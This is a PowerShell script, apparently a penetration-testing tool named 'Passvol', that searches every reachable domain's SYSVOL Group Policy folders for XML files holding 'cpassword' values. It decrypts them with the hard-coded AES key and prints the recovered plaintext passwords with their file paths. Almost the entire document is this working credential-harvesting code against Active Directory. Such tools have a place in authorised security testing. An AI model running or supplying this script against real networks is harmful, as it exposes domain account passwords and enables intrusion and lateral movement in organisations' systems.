$logo = @('

 ██▓███   ▄▄▄        ██████   ██████ ██▒   █▓ ▒█████   ██▓    
▓██░  ██▒▒████▄    ▒██    ▒ ▒██    ▒▓██░   █▒▒██▒  ██▒▓██▒    
▓██░ ██▓▒▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▓██  █▒░▒██░  ██▒▒██░    
▒██▄█▓▒ ▒░██▄▄▄▄██   ▒   ██▒  ▒   ██▒ ▒██ █░░▒██   ██░▒██░    
▒██▒ ░  ░ ▓█   ▓██▒▒██████▒▒▒██████▒▒  ▒▀█░  ░ ████▓▒░░██████▒
▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░  ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▓  ░
░▒ ░       ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░  ░ ░░    ░ ▒ ▒░ ░ ░ ▒  ░
░░         ░   ▒   ░  ░  ░  ░  ░  ░      ░░  ░ ░ ░ ▒    ░ ░   
               ░  ░      ░        ░       ░      ░ ░      ░  ░

Creator: Securethelogs    | @Securethelogs 
Includes Modifed Version Of Get-DecryptedCpassword | Author: Chris Campbell (@obscuresec)

')

$logo

$xmls = @()
$cpass = @()

# Query Sysvol for all domains found

$dom = @((Get-DnsClientGlobalSetting).SuffixSearchList)

foreach ($dmn in $dom){

$fnd = @(Get-Childitem -Path \\$dmn\sysvol\$dmn\Policies -Recurse -force -ErrorAction SilentlyContinue -Include *.xml*)

foreach ($d in $fnd.Fullname){

$cp = Get-Content -Path $d | Select-String -Pattern "cpassword"

if ($cp -ne $null){

$xmls += $d

}

}

}

# Pull the password value from the policy

foreach ($f in $xmls){

$regex = ‘cpassword=".*\"’
$a = select-string -Path $f -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value }
$password = @($a.Split(" ")[0] -replace "cpassword=", "" -replace '"', "")
$cpass += $password

} 


# Taken and modified from https://github.com/obscuresec/PowerShell/blob/master/Get-DecryptedCpassword

$count = 0

foreach ($Cpassword in $cpass){

Write-Output ""

Write-Output "Password Found In:"
$xmls[$count]


try {

        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)
            
        switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
        Write-Output ""
        Write-Output "Password:"

        [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 
        
    catch {Write-Error $Error[0]} 

    
    $count++

    }

